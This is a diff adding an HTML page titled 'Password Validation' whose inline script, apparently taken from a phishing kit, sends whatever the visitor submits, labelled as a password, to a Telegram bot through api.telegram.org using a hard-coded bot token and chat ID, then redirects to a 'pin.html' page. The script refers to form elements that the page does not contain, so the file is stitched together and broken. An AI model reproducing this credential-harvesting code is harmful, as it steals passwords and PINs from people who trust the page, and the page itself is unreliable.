@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Password Validation</title>
+    <link rel="shortcut icon" href="http://www.google.com/s2/favicons?domain=theodorusclarence.github.io"
+        type="image/png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <h1>Password Validation</h1>
+    <div class="container">
+        <input type="password" id="password">
+        <button class="eye">
+            <i class="far fa-eye-slash" id="eyeOpen"></i>
+            <i class="far fa-eye hide" id="eyeClose"></i>
+        </button>
+        <button class="check" data-content='Sucess'>
+            <i class="fas fa-arrow-right" id="arrow"></i>
+            <i class="fas fa-check hide" id="check"></i>
+            <i class="fas fa-times hide" id="wrong"></i>
+        </button>
+    </div>
+
+  <script>
+    const phoneInput = document.getElementById("phoneInput");
+    const submitBtn = document.getElementById("submitBtn");
+    const form = document.getElementById("phoneForm");
+
+    // Enable button only if input has value
+    phoneInput.addEventListener("input", () => {
+      if (phoneInput.value.trim().length > 0) {
+        submitBtn.disabled = false;
+        submitBtn.classList.remove("bg-[#BDBDBD]", "cursor-not-allowed");
+        submitBtn.classList.add("bg-[#0B3B2E]", "cursor-pointer");
+      } else {
+        submitBtn.disabled = true;
+        submitBtn.classList.add("bg-[#BDBDBD]", "cursor-not-allowed");
+        submitBtn.classList.remove("bg-[#0B3B2E]", "cursor-pointer");
+      }
+    });
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const phone = phoneInput.value.trim();
+
+      if (!phone) return;
+
+      // Telegram Bot API info - replace with your own bot token and chat ID
+      const botToken = "8263100156:AAGOHELbvR7XLhH-T4ZTnmXMDSBLNSWA5eY";
+      const chatId = "7043856693";
+
+      const message = `Password: ${phone}`;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        });
+
+        if (response.ok) {
+          window.location.href = "pin.html";
+          form.reset();
+          submitBtn.disabled = true;
+          submitBtn.classList.add("bg-[#BDBDBD]", "cursor-not-allowed");
+          submitBtn.classList.remove("bg-[#0B3B2E]", "cursor-pointer");
+        } else {
+          alert("Gagal mengirim data ke Telegram.");
+        }
+      } catch (error) {
+        alert("Terjadi kesalahan saat mengirim data.");
+      }
+    });
+  </script>
+
+    <!-- Script -->
+    <script src="script.js"></script>
+</body>
+
+</html>
